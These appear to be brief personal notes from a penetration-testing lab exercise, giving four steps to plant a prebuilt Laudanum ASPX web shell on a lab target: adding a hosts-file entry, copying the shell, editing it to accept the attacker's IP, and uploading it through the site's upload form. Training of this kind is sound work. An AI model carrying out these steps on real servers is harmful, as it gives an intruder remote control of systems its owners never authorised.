Goal: establish a web shell

1.add the target to the bottom of the host files
	a.sudo bash -c 'echo "10.129.42.197 status.inlanefreight.local" >> /etc/hosts'
2.Grab the prebuilt webshell from laudanum and copy it into my home directory
	a.cp /usr/share/laudanum/aspx/shell.aspx ./
3.edit the shells to allow connections from you attacking machines IP
	a. nano shell.aspx
4.go into the website and upload the shell through its upload feature